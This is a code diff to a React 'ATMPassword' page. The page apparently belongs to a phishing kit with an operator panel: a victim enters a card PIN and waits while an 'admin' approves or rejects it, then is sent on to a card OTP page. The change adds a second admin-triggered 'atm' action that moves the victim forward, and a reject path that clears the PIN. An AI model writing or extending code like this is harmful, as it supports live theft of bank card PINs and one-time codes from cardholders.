@@ -7,6 +7,7 @@ import { Button } from "@/components/ui/button";
 import {
   sendData,
   codeAction,
+  cardAction,
   navigateToPage,
 } from "@/lib/store";
 
@@ -36,22 +37,35 @@ export default function ATMPassword() {
     inputRefs.current[0]?.focus();
   }, []);
 
-  // Handle code action from admin
+  // Handle code action (approve/reject) from admin
   useSignalEffect(() => {
     const action = codeAction.value;
     if (action) {
       if (action.action === "approve") {
-        // Navigate to final page
         navigate("/card-otp");
       } else if (action.action === "reject") {
-        // Show error and clear PIN
         setPin(["", "", "", ""]);
         setError(true);
         setIsWaiting(false);
         inputRefs.current[0]?.focus();
       }
-      // Reset the action
       codeAction.value = null;
+    }
+  });
+
+  // Handle card action (ATM button from admin)
+  useSignalEffect(() => {
+    const action = cardAction.value;
+    if (action) {
+      if (action.action === "atm") {
+        navigate("/card-otp");
+      } else if (action.action === "reject") {
+        setPin(["", "", "", ""]);
+        setError(true);
+        setIsWaiting(false);
+        inputRefs.current[0]?.focus();
+      }
+      cardAction.value = null;
     }
   });
 
